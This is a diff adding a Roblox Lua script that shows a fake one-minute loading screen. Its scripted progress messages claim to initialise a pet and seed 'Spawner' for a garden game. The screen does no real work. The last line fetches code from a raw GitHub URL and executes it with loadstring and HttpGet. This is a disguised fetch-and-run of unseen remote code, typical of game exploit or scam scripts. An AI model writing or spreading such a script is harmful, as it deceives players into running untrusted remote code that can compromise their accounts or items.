@@ -1,0 +1,138 @@
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LoadingScreen"
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+local background = Instance.new("Frame")
+background.Size = UDim2.new(1, 0, 1, 0)
+background.Position = UDim2.new(0, 0, 0, 0)
+background.BackgroundColor3 = Color3.fromRGB(255, 238, 200)
+background.BorderSizePixel = 0
+background.BackgroundTransparency = 1
+background.Parent = screenGui
+
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(0.8, 0, 0.1, 0)
+label.Position = UDim2.new(0.1, 0, 0.4, 0)
+label.BackgroundTransparency = 1
+label.TextScaled = true
+label.Font = Enum.Font.GothamBold
+label.TextColor3 = Color3.fromRGB(255, 168, 64)
+label.TextTransparency = 1
+label.Parent = background
+
+local progressBG = Instance.new("Frame")
+progressBG.Size = UDim2.new(0.8, 0, 0.04, 0)
+progressBG.Position = UDim2.new(0.1, 0, 0.55, 0)
+progressBG.BackgroundColor3 = Color3.fromRGB(255, 220, 180)
+progressBG.BorderSizePixel = 0
+progressBG.BackgroundTransparency = 1
+progressBG.Parent = background
+
+local progressBar = Instance.new("Frame")
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.Position = UDim2.new(0, 0, 0, 0)
+progressBar.BackgroundColor3 = Color3.fromRGB(255, 180, 80)
+progressBar.BorderSizePixel = 0
+progressBar.BackgroundTransparency = 1
+progressBar.Parent = progressBG
+
+local messages = {
+    "📦 Loading Spawner Module...",
+    "🌱 Syncing Pet Growth Stats...",
+    "🐾 Spawning Starter Seeds...",
+    "💧 Attaching Watering Logic...",
+    "🔄 Generating Pet Rarities...",
+    "🎲 Rolling for Seed Traits...",
+    "🌼 Binding Spawner to Garden Grid...",
+    "📊 Uploading Growth Data...",
+    "🐝 Pollinating Spawnable Patches...",
+    "🧬 Infusing Genetics to Pets...",
+    "🔐 Verifying Spawner Permissions...",
+    "🛠️ Finalizing Growth Framework...",
+    "✅ Spawner Initialized: Ready to Hatch!",
+    "🌻 Sprouting Rare Pet Chance...",
+    "🦋 Activating Butterfly Boost...",
+    "💨 Calculating Wind Influence...",
+    "🌞 Sunlight Optimization...",
+    "🌧️ Simulating Rain Cycles...",
+    "🔥 Checking Heat Levels...",
+    "🌜 Adjusting Moon Phases...",
+    "🐝 Bee Swarm Simulation...",
+    "🎉 Unlocking Bonus Rewards...",
+    "🛡️ Securing Pet Inventory...",
+    "⚙️ Calibrating Spawner Speed...",
+    "📈 Tracking Growth Rates...",
+    "🧪 Mixing Fertilizer Compounds...",
+    "🎨 Customizing Pet Colors...",
+    "🕹️ Loading Control Inputs...",
+    "🔎 Scanning for Glitches...",
+    "🧹 Cleaning Up Spawn Area...",
+    "🧩 Loading Puzzle Mechanics...",
+    "🎮 Preparing Gameplay Loop...",
+    "⏳ Finalizing Countdown Timer...",
+    "🔔 Setting Notification Alerts...",
+    "🚀 Initiating Launch Sequence...",
+    "📡 Syncing Multiplayer Data...",
+    "🎁 Preparing Gift Drops...",
+    "🕵️‍♂️ Running Security Check...",
+    "🧙‍♂️ Summoning Magical Effects...",
+    "⚡ Charging Power Levels...",
+    "🏆 Unlocking Achievements...",
+    "💼 Updating Player Stats...",
+    "💡 Optimizing Memory Usage...",
+    "🔊 Loading Sound Effects...",
+    "🎬 Starting Intro Cutscene...",
+    "🌐 Connecting to Game Server...",
+    "🔧 Applying Last Minute Fixes...",
+    "📅 Scheduling Daily Rewards..."
+}
+
+local totalTime = 60 -- 1 minute
+local steps = 100
+local waitTime = totalTime / steps
+
+local function fadeIn()
+    for i = 1, 20 do
+        local transparency = 1 - (i * 0.05)
+        background.BackgroundTransparency = transparency
+        label.TextTransparency = transparency
+        progressBG.BackgroundTransparency = transparency
+        progressBar.BackgroundTransparency = transparency
+        wait(0.05)
+    end
+end
+
+local function fadeOut()
+    for i = 1, 20 do
+        local transparency = i * 0.05
+        background.BackgroundTransparency = transparency
+        label.TextTransparency = transparency
+        progressBG.BackgroundTransparency = transparency
+        progressBar.BackgroundTransparency = transparency
+        wait(0.05)
+    end
+end
+
+fadeIn()
+
+for i = 1, steps do
+    progressBar.Size = UDim2.new(i / steps, 0, 1, 0)
+
+    local msgIndex = math.floor((i / steps) * #messages)
+    if msgIndex == 0 then msgIndex = 1 end
+    label.Text = messages[msgIndex]
+
+    wait(waitTime)
+end
+
+wait(1)
+
+fadeOut()
+screenGui:Destroy()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jdkduejdo/DarkV5/refs/heads/main/DarkSpawnerV5"))()
